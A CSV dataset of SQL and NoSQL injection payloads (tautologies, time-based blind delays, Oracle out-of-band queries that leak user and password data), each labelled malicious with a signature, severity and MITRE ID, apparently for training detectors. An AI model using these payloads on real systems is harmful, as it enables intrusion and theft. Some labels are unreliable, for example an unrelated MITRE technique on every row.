Payload,Signature,AttackType,Severity,MITRE,Label,Description
$where: '1 == 1',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
{ $ne: 1 },SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
db.injection.insert({success:1});,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
|| 1==1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' && this.password.match(/.*/)//+%00,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' && this.passwordzz.match(/.*/)//+%00,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'%20%26%26%20this.password.match(/.*/)//+%00,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
{$gt: ''},SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
[$ne]=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';sleep(5000);,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';sleep(5000);',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';sleep(5000);+',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 and user_name() = 'dbo',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
\'; desc users; --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1\'1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' and non_existant_table = '1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or username is not NULL or username = ',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 uni/**/on select all from where,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
# from wapiti,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
sleep(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or sleep(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or sleep(5)#",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or sleep(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or sleep(5)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or sleep(5)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1) or sleep(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""") or sleep(5)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') or sleep(5)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1)) or sleep(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")) or sleep(5)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')) or sleep(5)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
;waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
);waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""";waitfor delay '0:0:5'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
');waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""");waitfor delay '0:0:5'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
));waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'));waitfor delay '0:0:5'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""));waitfor delay '0:0:5'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or pg_sleep(5)--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1) or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""") or pg_sleep(5)--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1)) or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")) or pg_sleep(5)--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')) or pg_sleep(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"SLEEP(5)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
SLEEP(5)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"or SLEEP(5)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or SLEEP(5)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
waitfor delay '00:00:05',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
waitfor delay '00:00:05'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
waitfor delay '00:00:05'#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
pg_SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
pg_SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
pg_SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or pg_SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or pg_SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or pg_SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AnD SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AnD SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
AnD SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
&&SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
&&SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
&&SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AnD SLEEP(5) ANd '1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'&&SLEEP(5)&&'1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
ORDER BY SLEEP(5),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
ORDER BY SLEEP(5)--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
ORDER BY SLEEP(5)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
+ SLEEP(10) + ',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
RANDOMBLOB(500000000/2),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
RANDOMBLOB(1000000000/2),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
’ or ‘1’=’1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'||utl_http.request('httP://192.168.1.1/')||',SQLInjection_Generic,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or sleep(__TIME__)#",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or sleep(__TIME__)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or sleep(__TIME__)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1) or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""") or sleep(__TIME__)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') or sleep(__TIME__)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1)) or sleep(__TIME__)#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""")) or sleep(__TIME__)=""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')) or sleep(__TIME__)=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
;waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
);waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
';waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""";waitfor delay '0:0:__TIME__'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
');waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""");waitfor delay '0:0:__TIME__'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
));waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'));waitfor delay '0:0:__TIME__'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""));waitfor delay '0:0:__TIME__'--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select user from sysibm.sysdummy1;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select session_user from sysibm.sysdummy1;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select system_user from sysibm.sysdummy1;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select current server from sysibm.sysdummy1;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select name from sysibm.systables;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select grantee from syscat.dbauth;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from syscat.tabauth;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from syscat.dbauth where grantee = current user;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select * from syscat.tabauth where grantee = current user;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
SELECT schemaname FROM syscat.schemata;,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)))) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
))))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)))))) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""") waitfor delay '0:0:20' /* ",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""") waitfor delay '0:0:20' --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')) waitfor delay '0:0:20' /* ,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')) waitfor delay '0:0:20' --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
